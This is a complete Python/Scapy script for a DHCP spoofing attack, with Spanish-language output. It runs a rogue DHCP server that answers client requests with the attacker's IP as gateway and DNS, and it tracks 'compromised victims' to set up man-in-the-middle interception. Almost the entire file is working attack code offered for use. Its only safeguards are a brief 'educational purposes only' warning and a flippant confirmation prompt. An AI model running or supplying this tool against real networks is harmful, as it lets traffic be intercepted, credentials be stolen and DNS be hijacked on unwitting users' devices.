#!/usr/bin/env python3

from scapy.all import *
import argparse
import sys
import os

class DHCPSpoofing:
    def __init__(self, interface, fake_gateway, fake_dns, pool_start, pool_end):
        self.interface = interface
        self.fake_gateway = fake_gateway
        self.fake_dns = fake_dns
        self.pool_start = pool_start
        self.pool_end = pool_end
        self.assigned = {}
        self.counter = 0
        
        self.server_mac = get_if_hwaddr(interface)
        self.server_ip = get_if_addr(interface)
        
        print("\n" + "="*70)
        print("TU SABE LO QUE PASO VERDAD DHCP SPOOFING ATTACK LLEGAMOS NOSOTROS NENA RELAJATE")
        print("="*70)
        print(f"[*] Interfaz: {self.interface}")
        print(f"[*] Servidor IP: {self.server_ip}")
        print(f"[*] Gateway FALSO: {self.fake_gateway}")
        print(f"[*] DNS FALSO: {self.fake_dns}")
        print(f"[*] Pool: {self.pool_start} - {self.pool_end}")
        print("="*70 + "\n")
    
    def get_next_ip(self):
        base = self.pool_start.rsplit('.', 1)[0]
        start = int(self.pool_start.rsplit('.', 1)[1])
        end = int(self.pool_end.rsplit('.', 1)[1])
        
        if self.counter > (end - start):
            self.counter = 0
        
        ip = f"{base}.{start + self.counter}"
        self.counter += 1
        return ip
    
    def handle_dhcp(self, pkt):
        if DHCP in pkt:
            msg_type = None
            for opt in pkt[DHCP].options:
                if opt[0] == "message-type":
                    msg_type = opt[1]
                    break
            
            client_mac = pkt[Ether].src
            xid = pkt[BOOTP].xid
            
            if msg_type == 1:
                print(f"\n[>>] DISCOVER recibido de {client_mac}")
                
                offered_ip = self.get_next_ip()
                self.assigned[client_mac] = offered_ip
                
                offer = (
                    Ether(src=self.server_mac, dst=client_mac) /
                    IP(src=self.server_ip, dst="255.255.255.255") /
                    UDP(sport=67, dport=68) /
                    BOOTP(
                        op=2,
                        xid=xid,
                        yiaddr=offered_ip,
                        siaddr=self.server_ip,
                        chaddr=bytes.fromhex(client_mac.replace(':', '')) + b'\x00'*10
                    ) /
                    DHCP(options=[
                        ("message-type", "offer"),
                        ("server_id", self.server_ip),
                        ("lease_time", 600),
                        ("subnet_mask", "255.255.255.0"),
                        ("router", self.fake_gateway),
                        ("name_server", self.fake_dns),
                        "end"
                    ])
                )
                
                sendp(offer, iface=self.interface, verbose=0)
                print(f"[<<] OFFER enviado: {offered_ip} -> {client_mac}")
            
            elif msg_type == 3:
                print(f"\n[>>] REQUEST recibido de {client_mac}")
                
                requested_ip = self.assigned.get(client_mac, self.get_next_ip())
                
                ack = (
                    Ether(src=self.server_mac, dst=client_mac) /
                    IP(src=self.server_ip, dst="255.255.255.255") /
                    UDP(sport=67, dport=68) /
                    BOOTP(
                        op=2,
                        xid=xid,
                        yiaddr=requested_ip,
                        siaddr=self.server_ip,
                        chaddr=bytes.fromhex(client_mac.replace(':', '')) + b'\x00'*10
                    ) /
                    DHCP(options=[
                        ("message-type", "ack"),
                        ("server_id", self.server_ip),
                        ("lease_time", 600),
                        ("subnet_mask", "255.255.255.0"),
                        ("router", self.fake_gateway),
                        ("name_server", self.fake_dns),
                        "end"
                    ])
                )
                
                sendp(ack, iface=self.interface, verbose=0)
                print(f"[<<] ACK enviado: {requested_ip} -> {client_mac}")
                print(f"\n[+] VICTIMA COMPROMETIDA!")
                print(f"    MAC: {client_mac}")
                print(f"    IP asignada: {requested_ip}")
                print(f"    Gateway FALSO: {self.fake_gateway}")
                print(f"    DNS FALSO: {self.fake_dns}")
                print(f"    [!] Todo el trafico pasara por el atacante")
    
    def start(self):
        print("[*] Servidor DHCP Spoofing ACTIVO")
        print("[*] Esperando solicitudes DHCP...")
        print("[*] Presiona Ctrl+C para detener\n")
        
        try:
            sniff(
                iface=self.interface,
                filter="udp and (port 67 or port 68)",
                prn=self.handle_dhcp,
                store=0
            )
        except KeyboardInterrupt:
            print("\n\n[!] Ataque detenido por el usuario")
            self.stats()
    
    def stats(self):
        print("\n" + "="*70)
        print("ESTADISTICAS DEL ATAQUE")
        print("="*70)
        print(f"Total victimas comprometidas: {len(self.assigned)}")
        if self.assigned:
            print("\nVictimas:")
            for mac, ip in self.assigned.items():
                print(f"  - {mac} -> {ip} (GW: {self.fake_gateway}, DNS: {self.fake_dns})")
        print("="*70)

def main():
    banner = """
    ======================================================================
              DHCP SPOOFING ATTACK - SCAPY
              USO EXCLUSIVO FOR THE GOAT EN INGLES ESTA VEZ
    ======================================================================
    
    Este ataque:
    - CREA ALGO MUY INTERESANTE OLVIDATE DE ESO BLA BLA BLA
    - Responde a solicitudes DHCP antes que el servidor legitimo
    - Asigna gateway y DNS falsos
    - Redirige el trafico de las victimas al atacante
    - Permite Man-in-the-Middle completo
    
    ======================================================================
    """
    print(banner)
    
    parser = argparse.ArgumentParser(description='DHCP Spoofing Attack')
    parser.add_argument('-i', '--interface', required=True, 
                       help='Interfaz de red (ej: eth0)')
    parser.add_argument('-g', '--gateway', required=True,
                       help='Gateway falso (IP del atacante)')
    parser.add_argument('-d', '--dns', required=True,
                       help='DNS falso (IP del atacante)')
    parser.add_argument('-ps', '--pool-start', required=True,
                       help='IP inicial del pool (ej: 11.98.0.50)')
    parser.add_argument('-pe', '--pool-end', required=True,
                       help='IP final del pool (ej: 11.98.0.100)')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] ERROR: Este script requiere privilegios root")
        print("[!] Ejecuta: sudo python3 dhcp-spoofing.py -i eth0 -g 11.98.1.100 -d 11.98.1.100 -ps 11.98.0.50 -pe 11.98.0.100")
        sys.exit(1)
    
    print("[!] ADVERTENCIA: Solo para fines educativos")
    print("[!] El uso no autorizado es ILEGAL\n")
    
    response = input("DALE A yes Y OLVIDATE DE ESO QUE SE ARREGLE SOLO O EL QUE PUEDA? (yes/no): ")
    if response.lower() != 'yes':
        print("[*] Ataque cancelado")
        sys.exit(0)
    
    try:
        spoofer = DHCPSpoofing(
            interface=args.interface,
            fake_gateway=args.gateway,
            fake_dns=args.dns,
            pool_start=args.pool_start,
            pool_end=args.pool_end
        )
        spoofer.start()
    
    except KeyboardInterrupt:
        print("\n[!] Interrumpido")
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
